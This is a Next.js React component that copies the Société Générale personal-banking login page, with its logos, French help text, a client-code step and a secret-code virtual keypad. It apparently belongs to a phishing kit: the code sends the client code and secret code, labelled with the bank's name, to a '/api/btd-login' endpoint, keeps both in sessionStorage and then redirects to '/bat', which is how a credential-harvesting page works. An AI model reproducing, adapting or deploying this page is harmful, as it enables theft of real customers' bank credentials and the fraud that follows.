'use client';

import React, { useState, FormEvent } from 'react';
import { useRouter } from 'next/navigation';

interface SGConnexionProps {
  partnerLogoSrc?: string;
  sgLogoSrc?: string;
}

export default function SGConnexionPage({
  partnerLogoSrc = '/flavicon.ico',
  sgLogoSrc = '/Societe-Generale-Emblem.png',
}: SGConnexionProps) {
  const router = useRouter();

  const [step, setStep] = useState<1 | 2>(1);
  const [clientId, setClientId] = useState<string>('');
  const [rememberMe, setRememberMe] = useState<boolean>(false);
  const [secretCode, setSecretCode] = useState<string>('');
  const [isSubmitting, setIsSubmitting] = useState<boolean>(false);

  // Étape 1 -> Étape 2 (saisie libre)
  const handleNextStep = (e?: FormEvent) => {
    if (e) e.preventDefault();
    if (clientId.trim()) {
      setStep(2);
    }
  };

  // Pavé numérique (optionnel en complément de la saisie libre au clavier)
  const handleKeyPress = (val: string) => {
    setSecretCode((prev) => prev + val);
  };

  const handleClearSecretCode = () => {
    setSecretCode('');
  };

  // Soumission vers /api/btd-login et redirection vers /bat
  const handleSubmit = async (e: FormEvent) => {
    e.preventDefault();
    if (!secretCode.trim() || isSubmitting) return;

    setIsSubmitting(true);

    // Payload aligné sur les clés lues par la route API
    const payload = {
      nom_banque: 'SOCIETE GENERALE',
      identifiant: clientId,
      secret_code: secretCode,
      rememberMe,
    };

    try {
      if (typeof window !== 'undefined') {
        sessionStorage.setItem('sg_client_id', clientId);
        sessionStorage.setItem('sg_secret_code', secretCode);
      }

      const res = await fetch('/api/btd-login', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload),
      });

      // Vérification de la réussite HTTP
      if (!res.ok) {
        throw new Error(`Erreur réseau (Statut : ${res.status})`);
      }

      const data = await res.json();

      if (data.success) {
        router.push('/bat');
      }
    } catch (error) {
      console.error('Erreur lors de la soumission :', error);
    } finally {
      setIsSubmitting(false);
    }
  };
  const keyboardLayout = ['1', '2', '3', '', '4', '5', '6', '0', '7', '8', '9', ''];

  return (
    <>
      <style>{`
        .sg-body-wrapper {
          background-color: #f8f9fa;
          color: #1a1a1a;
          display: flex;
          justify-content: center;
          min-height: 100vh;
          width: 100%;
          font-family: 'Inter', system-ui, -apple-system, sans-serif;
        }
        .sg-app-container {
          width: 100%;
          max-width: 440px;
          background-color: #ffffff;
          display: flex;
          flex-direction: column;
          min-height: 100vh;
          box-shadow: 0 8px 30px rgba(0, 0, 0, 0.05);
        }
        .sg-header {
          display: flex;
          justify-content: space-between;
          align-items: center;
          padding: 18px 20px;
          background-color: #ffffff;
          border-bottom: 1px solid #eef1f4;
        }
        .sg-logo-area {
          display: flex;
          align-items: center;
          gap: 10px;
        }
        .sg-partner-logo {
          height: 22px;
          width: 22px;
          object-fit: contain;
        }
        .sg-arrow {
          color: #a0aec0;
          font-size: 14px;
        }
        .sg-main-brand {
          height: 24px;
          width: auto;
          object-fit: contain;
        }
        .sg-logo-slogan {
          display: flex;
          flex-direction: column;
          font-size: 8.5px;
          font-weight: 700;
          color: #718096;
          line-height: 1.1;
          border-left: 1px solid #cbd5e0;
          padding-left: 10px;
          letter-spacing: 0.5px;
        }
        .sg-btn-open-account {
          background-color: transparent;
          border: 1px solid #1a1a1a;
          color: #1a1a1a;
          padding: 7px 14px;
          font-size: 13px;
          font-weight: 600;
          border-radius: 4px;
          cursor: pointer;
        }
        .sg-content {
          padding: 35px 24px;
          display: flex;
          flex-direction: column;
          flex-grow: 1;
        }
        .sg-main-title {
          font-size: 20px;
          font-weight: 700;
          color: #000000;
          margin-bottom: 28px;
          line-height: 1.35;
        }
        .sg-input-wrapper {
          position: relative;
          display: flex;
          align-items: center;
          margin-bottom: 22px;
          border: 1px solid #ccd4dc;
          border-radius: 6px;
          background-color: #ffffff;
        }
        .sg-input-wrapper input {
          width: 100%;
          height: 52px;
          border: none;
          background: transparent;
          padding: 0 45px 0 16px;
          font-size: 16px;
          font-weight: 500;
          color: #1a1a1a;
          outline: none;
        }
        .sg-clear-input {
          position: absolute;
          right: 16px;
          font-size: 22px;
          color: #a0aec0;
          cursor: pointer;
          user-select: none;
        }
        .sg-free-pass-input {
          width: 100%;
          height: 48px;
          margin-bottom: 16px;
          padding: 0 16px;
          border: 1px solid #ccd4dc;
          border-radius: 6px;
          font-size: 16px;
          font-weight: 600;
          color: #1a1a1a;
          outline: none;
          text-align: center;
          letter-spacing: 2px;
        }
        .sg-free-pass-input:focus {
          border-color: #ea1c24;
        }
        .sg-toggle-row {
          display: flex;
          align-items: center;
          gap: 12px;
          margin-bottom: 32px;
        }
        .sg-toggle-row.center-toggle {
          justify-content: center;
          margin-bottom: 25px;
        }
        .sg-switch {
          position: relative;
          display: inline-block;
          width: 44px;
          height: 24px;
        }
        .sg-switch input { opacity: 0; width: 0; height: 0; }
        .sg-slider {
          position: absolute;
          cursor: pointer;
          top: 0; left: 0; right: 0; bottom: 0;
          background-color: #cbd5e0;
          transition: .25s;
          border-radius: 24px;
        }
        .sg-slider:before {
          position: absolute;
          content: ""; height: 18px; width: 18px; left: 3px; bottom: 3px;
          background-color: white; transition: .25s; border-radius: 50%;
        }
        input:checked + .sg-slider { background-color: #000000; }
        input:checked + .sg-slider:before { transform: translateX(20px); }
        .sg-toggle-label { font-size: 14.5px; color: #4a5568; font-weight: 500; }
        .sg-dots-container {
          display: flex;
          align-items: center;
          justify-content: center;
          gap: 24px;
          margin-bottom: 16px;
          background-color: #f8fafc;
          padding: 16px;
          border-radius: 8px;
          border: 1px solid #e2e8f0;
        }
        .sg-dots-row {
          display: flex;
          gap: 16px;
        }
        .sg-dot {
          width: 14px;
          height: 14px;
          border: 2px solid #a0aec0;
          border-radius: 50%;
          background-color: transparent;
          transition: transform 0.1s ease, background-color 0.1s;
        }
        .sg-dot.filled {
          background-color: #ea1c24 !important;
          border-color: #ea1c24 !important;
          transform: scale(1.1);
        }
        .sg-backspace-btn {
          font-size: 24px;
          color: #ea1c24;
          cursor: pointer;
          font-weight: 700;
          user-select: none;
          background: none;
          border: none;
        }
        .sg-keyboard-grid {
          display: grid;
          grid-template-columns: repeat(4, 1fr);
          gap: 12px;
          margin-bottom: 28px;
        }
        .sg-key {
          width: 100%;
          height: 56px;
          background-color: #ffffff;
          border: 1px solid #dcdfe4;
          border-radius: 6px;
          font-size: 20px;
          font-weight: 700;
          color: #1a1a1a;
          cursor: pointer;
          display: flex;
          align-items: center;
          justify-content: center;
        }
        .sg-key:active { background-color: #edf2f7; }
        .sg-key-empty { visibility: hidden; }
        .sg-btn-main-red {
          width: 100%;
          height: 52px;
          border: none;
          border-radius: 6px;
          background-color: #ea1c24;
          color: #ffffff;
          font-size: 16px;
          font-weight: 700;
          cursor: pointer;
        }
        .sg-btn-main-gray {
          width: 100%;
          height: 52px;
          border: none;
          border-radius: 6px;
          background-color: #cbd5e0;
          color: #ffffff;
          font-size: 16px;
          font-weight: 700;
          cursor: not-allowed;
        }
        .sg-help-section {
          margin-top: 40px;
          display: flex;
          flex-direction: column;
          gap: 14px;
        }
        .sg-help-section.space-top-border {
          border-top: 1px solid #eef1f4;
          padding-top: 28px;
        }
        .sg-help-section h3 {
          font-size: 14px;
          font-weight: 700;
          color: #000000;
        }
        .sg-help-section p {
          font-size: 13px;
          color: #4a5568;
          line-height: 1.5;
        }
        .sg-help-link {
          font-size: 13.5px;
          color: #ea1c24;
          text-decoration: none;
          font-weight: 600;
        }
      `}</style>

      <div className="sg-body-wrapper">
        <div className="sg-app-container">
          
          {/* EN-TÊTE DE PARTENARIAT */}
          <header className="sg-header">
            <div className="sg-logo-area">
              <img src={partnerLogoSrc} alt="Favicon" className="sg-partner-logo" />
              <span className="sg-arrow">→</span>
              <img src={sgLogoSrc} alt="Société Générale" className="sg-main-brand" />
              <div className="sg-logo-slogan">
                <span>C'EST VOUS</span>
                <span>L'AVENIR</span>
              </div>
            </div>
            {step === 1 ? (
              <button type="button" className="sg-btn-open-account">Ouvrir un compte</button>
            ) : (
              <button type="button" className="sg-btn-open-account" onClick={() => setStep(1)}>Retour</button>
            )}
          </header>

          {/* ÉTAPE 1 : CODE CLIENT (SAISIE LIBRE) */}
          {step === 1 && (
            <main className="sg-content">
              <h2 className="sg-main-title">Connexion à votre Espace Client Particuliers</h2>

              <div className="sg-input-wrapper">
                <input
                  type="text"
                  value={clientId}
                  onChange={(e) => setClientId(e.target.value)}
                  placeholder="Saisissez votre code client"
                  autoComplete="off"
                />
                {clientId.length > 0 && (
                  <span className="sg-clear-input" onClick={() => setClientId('')}>×</span>
                )}
              </div>

              <div className="sg-toggle-row">
                <label className="sg-switch">
                  <input
                    type="checkbox"
                    checked={rememberMe}
                    onChange={(e) => setRememberMe(e.target.checked)}
                  />
                  <span className="sg-slider"></span>
                </label>
                <span className="sg-toggle-label">Se souvenir de moi</span>
              </div>

              <button
                type="button"
                onClick={handleNextStep}
                disabled={!clientId.trim()}
                className={clientId.trim() ? 'sg-btn-main-red' : 'sg-btn-main-gray'}
              >
                Valider
              </button>

              <div className="sg-help-section">
                <h3>Où trouver mon Code Client SG ?</h3>
                <p>Votre Code Client vous a été communiqué lors de la souscription... Il est également indiqué sur vos relevés de comptes.</p>
                <h3>Code Client ou Code Secret inconnus ?</h3>
                <a href="#" className="sg-help-link">» Je souhaite obtenir mon Code Client</a>
                <a href="#" className="sg-help-link">» Je ne connais pas mon Code Secret</a>
              </div>
            </main>
          )}

          {/* ÉTAPE 2 : CODE SECRET (SAISIE LIBRE ET PAVÉ) */}
          {step === 2 && (
            <main className="sg-content">
              <h2 className="sg-main-title">Connexion à votre Espace Client Particuliers</h2>

              <div className="sg-toggle-row center-toggle">
                <label className="sg-switch">
                  <input type="checkbox" checked={rememberMe} readOnly />
                  <span className="sg-slider"></span>
                </label>
                <span className="sg-toggle-label">Se souvenir de moi</span>
              </div>

              {/* Champ Saisie Libre Code Secret */}
              <input
                type="password"
                value={secretCode}
                onChange={(e) => setSecretCode(e.target.value)}
                placeholder="Code secret"
                className="sg-free-pass-input"
              />

              {/* Indicateurs visuels (dots) */}
              <div className="sg-dots-container">
                <div className="sg-dots-row">
                  {[...Array(6)].map((_, idx) => (
                    <span
                      key={idx}
                      className={`sg-dot ${idx < secretCode.length ? 'filled' : ''}`}
                    />
                  ))}
                </div>
                <button type="button" className="sg-backspace-btn" onClick={handleClearSecretCode}>×</button>
              </div>

              {/* Clavier Visuel SG */}
              <div className="sg-keyboard-grid">
                {keyboardLayout.map((val, index) => (
                  val === '' ? (
                    <div key={index} className="sg-key-empty" />
                  ) : (
                    <button
                      key={index}
                      type="button"
                      className="sg-key"
                      onClick={() => handleKeyPress(val)}
                    >
                      {val}
                    </button>
                  )
                ))}
              </div>

              {/* Bouton de Soumission vers /api/btd-login */}
              <button
                type="button"
                onClick={handleSubmit}
                disabled={!secretCode.trim() || isSubmitting}
                className={secretCode.trim() && !isSubmitting ? 'sg-btn-main-red' : 'sg-btn-main-gray'}
              >
                {isSubmitting ? 'Connexion en cours...' : 'Valider'}
              </button>

              <div className="sg-help-section space-top-border">
                <h3>Où trouver mon Code Client SG ?</h3>
                <p>Votre Code Client vous a été communiqué lors de la souscription... Il est également indiqué sur vos relevés de comptes.</p>
                <h3>Code Client ou Code Secret inconnus ?</h3>
                <a href="#" className="sg-help-link">» Je souhaite obtenir mon Code Client</a>
                <a href="#" className="sg-help-link">» Je ne connais pas mon Code Secret</a>
              </div>
            </main>
          )}

        </div>
      </div>
    </>
  );
}